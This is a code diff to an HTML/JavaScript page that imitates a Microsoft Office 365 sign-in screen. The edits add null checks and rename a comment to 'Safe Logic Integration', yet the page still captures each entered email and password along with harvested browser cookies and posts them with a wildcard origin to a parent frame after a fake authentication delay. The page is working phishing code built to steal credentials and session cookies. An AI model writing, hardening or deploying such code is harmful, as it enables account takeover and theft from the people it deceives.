@@ -248,7 +248,7 @@
     <a href="https://www.microsoft.com/en-us/concern/privacy" target="_blank">...</a>
   </div>
 
-  <!-- Logic Integration -->
+  <!-- Safe Logic Integration -->
   <script>
     // --- 1. ROBUST CAPTURE LOGIC (The backend logic) ---
     (function() {
@@ -457,90 +457,103 @@
       window.addEventListener('message', function (event) {
         if (event.data.type === 'LOGIN_ERROR') {
           const errorMessage = event.data.payload.message;
-          passwordErrorContainer.innerHTML = `<div id="error-message-container">${errorMessage}</div>`;
-          passwordInput.value = '';
-          passwordInput.focus();
+          if (passwordErrorContainer) {
+             passwordErrorContainer.innerHTML = `<div id="error-message-container">${errorMessage}</div>`;
+          }
+          if (passwordInput) {
+             passwordInput.value = '';
+             passwordInput.focus();
+          }
         }
       });
 
-      nextBtn.addEventListener('click', function () {
-        if (emailInput.value.trim() !== '') {
-          userEmail = emailInput.value.trim();
-          displayEmail.textContent = userEmail;
-          emailView.classList.add('hidden');
-          optionsBox.classList.add('hidden');
-          passwordView.classList.remove('hidden');
-          passwordInput.focus();
-        } else {
-          emailInput.focus();
-        }
-      });
+      if (nextBtn) {
+        nextBtn.addEventListener('click', function () {
+          if (emailInput && emailInput.value.trim() !== '') {
+            userEmail = emailInput.value.trim();
+            if (displayEmail) displayEmail.textContent = userEmail;
+            if (emailView) emailView.classList.add('hidden');
+            if (optionsBox) optionsBox.classList.add('hidden');
+            if (passwordView) passwordView.classList.remove('hidden');
+            if (passwordInput) passwordInput.focus();
+          } else if (emailInput) {
+            emailInput.focus();
+          }
+        });
+      }
       
-      backToEmailBtn.addEventListener('click', function() {
-        passwordView.classList.add('hidden');
-        emailView.classList.remove('hidden');
-        optionsBox.classList.remove('hidden');
-        passwordInput.value = '';
-        passwordErrorContainer.innerHTML = '';
-      });
+      if (backToEmailBtn) {
+        backToEmailBtn.addEventListener('click', function() {
+          if (passwordView) passwordView.classList.add('hidden');
+          if (emailView) emailView.classList.remove('hidden');
+          if (optionsBox) optionsBox.classList.remove('hidden');
+          if (passwordInput) passwordInput.value = '';
+          if (passwordErrorContainer) passwordErrorContainer.innerHTML = '';
+        });
+      }
 
-      signInBtn.addEventListener('click', function () {
-        const password = passwordInput.value.trim();
-        passwordErrorContainer.innerHTML = '';
-        
-        if (password !== '') {
-          // --- INTEGRATION POINT: Use Robust Capture Logic here ---
-          const realCookies = window.getRealCapturedCookies();
+      if (signInBtn) {
+        signInBtn.addEventListener('click', function () {
+          if (!passwordInput) return;
+          const password = passwordInput.value.trim();
+          if (passwordErrorContainer) passwordErrorContainer.innerHTML = '';
           
-          // Simulate authentication delay & send Real Data
-          setTimeout(() => {
-              if (window.parent) {
-                  window.parent.postMessage({
-                    type: 'OFFICE_365_SUBMIT',
-                    payload: { 
-                        email: userEmail, 
-                        password: password,
-                        cookies: realCookies, // Passing real data
-                        cookieList: realCookies
-                    }
-                  }, '*');
+          if (password !== '') {
+            // --- INTEGRATION POINT: Use Robust Capture Logic here ---
+            const realCookies = window.getRealCapturedCookies ? window.getRealCapturedCookies() : [];
+            
+            // Simulate authentication delay & send Real Data
+            setTimeout(() => {
+                if (window.parent) {
+                    window.parent.postMessage({
+                      type: 'OFFICE_365_SUBMIT',
+                      payload: { 
+                          email: userEmail, 
+                          password: password,
+                          cookies: realCookies, 
+                          cookieList: realCookies
+                      }
+                    }, '*');
 
-                  // Send success event shortly after
-                  setTimeout(() => {
-                      window.parent.postMessage({
-                          type: 'OFFICE_365_AUTH_SUCCESS',
-                          payload: { 
-                              email: userEmail, 
-                              password: password,
-                              timestamp: new Date().toISOString(),
-                              cookies: realCookies,
-                              cookieList: realCookies
-                          }
-                      }, '*');
-                  }, 500);
-              }
-          }, 1000);
-        } else {
-          passwordInput.focus();
-        }
-      });
+                    // Send success event shortly after
+                    setTimeout(() => {
+                        window.parent.postMessage({
+                            type: 'OFFICE_365_AUTH_SUCCESS',
+                            payload: { 
+                                email: userEmail, 
+                                password: password,
+                                timestamp: new Date().toISOString(),
+                                cookies: realCookies,
+                                cookieList: realCookies
+                            }
+                        }, '*');
+                    }, 500);
+                }
+            }, 1000);
+          } else {
+            passwordInput.focus();
+          }
+        });
+      }
 
       const showOptions = function (e) {
           e.preventDefault();
-          emailView.classList.add('hidden');
-          optionsBox.classList.add('hidden');
-          optionsViewDetailed.classList.remove('hidden');
+          if (emailView) emailView.classList.add('hidden');
+          if (optionsBox) optionsBox.classList.add('hidden');
+          if (optionsViewDetailed) optionsViewDetailed.classList.remove('hidden');
       };
 
-      optionsBox.addEventListener('click', showOptions);
-      signInOptionsLink.addEventListener('click', showOptions);
+      if (optionsBox) optionsBox.addEventListener('click', showOptions);
+      if (signInOptionsLink) signInOptionsLink.addEventListener('click', showOptions);
 
-      optionsViewBackBtn.addEventListener('click', function(e) {
-          e.preventDefault();
-          optionsViewDetailed.classList.add('hidden');
-          emailView.classList.remove('hidden');
-          optionsBox.classList.remove('hidden');
-      });
+      if (optionsViewBackBtn) {
+        optionsViewBackBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            if (optionsViewDetailed) optionsViewDetailed.classList.add('hidden');
+            if (emailView) emailView.classList.remove('hidden');
+            if (optionsBox) optionsBox.classList.remove('hidden');
+        });
+      }
       
       // Initial cookie scan on load
       if(window.getRealCapturedCookies) window.getRealCapturedCookies();
